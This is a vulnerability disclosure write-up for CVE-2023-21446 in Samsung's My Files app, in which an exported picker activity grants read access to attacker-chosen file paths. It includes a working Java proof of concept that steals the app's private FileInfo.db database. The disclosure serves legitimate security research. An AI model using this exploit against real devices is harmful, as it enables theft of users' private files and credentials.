# Details

<table>
    <tr>
        <td>Name</td>
        <td>My Files</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.myfiles</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.30</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.02.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21446">CVE-2023-21446</a> (SVE-2022-2399)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1180</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/127.%20My%20Files%20—%20Theft%20of%20arbitrary%20files/Oversecured_report.png)

Oversecured found that the My Files app passes data in the exported activity `com.sec.android.app.myfiles.external.ui.PickerActivity` to `Activity.setResult()`. While investigating, it turned out that the app passes files to the attacker, but it also adds the `Intent.FLAG_GRANT_READ_URI_PERMISSION` flag. Moreover, the attacker can control the file path through the `uri` parameter. This leads to the theft of arbitrary files. For example, an attacker could use this vulnerability to steal files containing various credentials of services added to the app.

**Proof of Concept**

Stealing the `/data/user/0/com.sec.android.app.myfiles/databases/FileInfo.db` file. When the user sees a blank screen and clicks Done, the file is leaked to the attacker.

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent("com.sec.android.app.myfiles.PICK_SELECT_PATH");
    i.setClassName("com.sec.android.app.myfiles", "com.sec.android.app.myfiles.external.ui.PickerActivity");
    i.putExtra("uri", "/data/user/0/com.sec.android.app.myfiles/databases/FileInfo.db");
    startActivityForResult(i, 0);
}

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    Log.d("evil", "Result: " + data);
    try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
        Log.d("evil", IOUtils.toString(inputStream));
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```

## References

- [Oversecured Blog. Android security checklist: theft of arbitrary files](https://blog.oversecured.com/Android-security-checklist-theft-of-arbitrary-files/)
